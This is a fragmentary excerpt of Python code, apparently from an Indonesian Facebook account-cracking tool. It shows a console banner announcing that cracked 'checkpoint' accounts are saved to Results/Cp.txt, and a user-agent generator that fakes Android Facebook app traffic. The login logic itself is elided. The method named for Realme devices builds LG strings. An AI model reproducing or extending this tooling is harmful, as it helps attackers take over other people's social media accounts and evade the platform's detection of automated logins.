...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_version = random.choice(['5.0.0', '5.1.0'])
            self.android_model = random.choice(['F320L'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; LG {} Build/T3L180; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36[FBAN/EMA; FBLC/en_US; FBAV/309.0.0.16.451674;]'.format(self.android_version, self.android_model, self.build, self.browser_version))
